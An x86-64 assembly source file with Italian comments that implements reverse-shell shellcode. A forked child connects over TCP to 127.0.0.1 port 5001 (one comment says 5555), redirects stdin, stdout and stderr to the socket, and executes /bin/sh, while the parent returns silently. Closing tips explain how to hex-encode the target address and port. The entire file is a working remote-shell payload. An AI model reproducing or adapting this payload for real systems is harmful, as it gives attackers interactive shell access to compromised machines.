        section .text
        global _start
_start:
        ; Per un elenco delle systemcall con gli argomenti nei registri: https://syscalls.w3challs.com/?arch=x86_64
        mov rax,0x39                ; Identificativo fork
        syscall
        
        cmp rax,0x0
        jz figlio
        ; Padre
        ; Se devo terminare l'esecuzione, decommentare le seguenti tre righe
        ;mov rax,0x3c
        ;xor rdi,rdi
        ;syscall
        ; Se non devo terminare l'esecuzione, ma devo ritornare alla funzione chiamante, allora decommentare le seguenti due righe
        xor rax,rax
        ret ; Ritorno zero
        
figlio:
        ; Spiano a zero alcuni registri
        xor rdi,rdi
        xor rsi,rsi
        xor rdx,rdx
        xor rax,rax
        xor r8,r8
        ; socket (AF_INET, SOCK_STREAM, IPPROTO_IP ) = 3
        mov rdi,0x2 ; Dominio PF_INET che in pratica definisce il formato d'indirizzo AF_INET
        mov rsi,0x1 ; Definisce il tipo di socket, ossia lo stile di comunicazione: 1 indica
                    ; un canale di comunicazione bidirezionale, affidabile eccetera...
                    ; il sistema operativo offrira` di fatto TCP
        mov rdx,0x0 ; 0 perche' il protocollo e` implicitamente compreso dal tipo di socket indicato
                    ; come secondo argomento
        mov rax,0x29 ; Identificativo della system call ``socket"
        syscall
        mov r8,rax ; Metto in r8 il valore di ritorno di socket, ossia del file descriptor aperto
        
        ; Spiano a zero alcuni registri
        xor rdi,rdi
        xor rsi,rsi
        xor rdx,rdx
        ; connect(3, {sa_family=AF_INET, sin_port=htons(5555), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
        mov rdi,r8 ; Primo argomento di connect: il file descriptor
        push rsi ; Mi riservo uno spazio di zero
        mov byte [rsp],0x2 ; Metto nei bit meno significativi AF_INET (=2) per un totale di un byte
        mov word [rsp+0x2],0x8913 ; Metto, alla sinistra di quanto appena scritto sopra, il valore della porta: 5001 (word=16 bit)
        mov dword [rsp+0x4],0x0100007F ; Metto, alla sinistra di quanto appena scritto sopra, l'IP 127.0.0.1 (senza ``."; dword=32 bit).
                                       ; Mi muovo sullo stack e scrivo sullo stack, tenendo conto del Little endian.
        mov rsi,rsp ; Secondo aromento di connect: indirizzo di partenza della struct appena scritta sullo stack
        mov rdx,0x10 ; Terzo argomento di connect: la lunghezza del secondo argomento (deve essere di 16, anche
                     ; se non andro` mai a leggere oltre l'ultimo numero dell'indirizzo IP)
        mov rax,0x2A ; Identificativo della system call ``connect"
        syscall
        
        ; (Ricorda che rdi contiene il file descriptor della socket)
        ; dup2 (3, 0) = 0
        xor rax,rax
        xor rsi,rsi
        mov rax,0x21 ; Identificativo della system call ``dup2"
        syscall
        ; dup2 (3, 1) = 1
        xor rsi,rsi
        xor rax,rax
        mov rsi,0x1
        mov rax,0x21
        syscall
        ; dup2 (3, 2) = 2
        xor rsi,rsi
        xor rax,rax
        mov rsi,0x2
        mov rax,0x21
        syscall

        ;execve ("/bin/sh ", NULL, NULL) = 0
        xor rdi,rdi
        xor rsi,rsi ; Secondo argomento: argv
        xor rdx,rdx ; Terzo argomento: envp
        xor rax,rax
        mov rdi,0x68732F6E69622F2F ; Imposto il primo argomento con: "//bin/sh"
        shr rdi,0x8 ; Shifto a destra per buttare il primo "/" (che e` ridondante) e metto \0
        push rdi ; Metto la stringa
        push rsp ; Metto l'indirizzo di partenza della stringa
        pop rdi ; Primo argomento: mi prendo l'indirizzo di partenza della stringa ``/bin/sh\0"
        mov rax,0x3B ; Identificativo della system call ``execve"
        syscall

; -----------------------------------------------------------------------------------------------------------------------
; | Per scrivere il numero della porta e il numero dell'indirizzo IP consiglio di utilizzare la funzione hex di Python. |
; | Per stabilire la stringa "//bin/sh" in numeri esadecimali mi sono avvalso della funzione hex(ord()) di Python.      |
; -----------------------------------------------------------------------------------------------------------------------
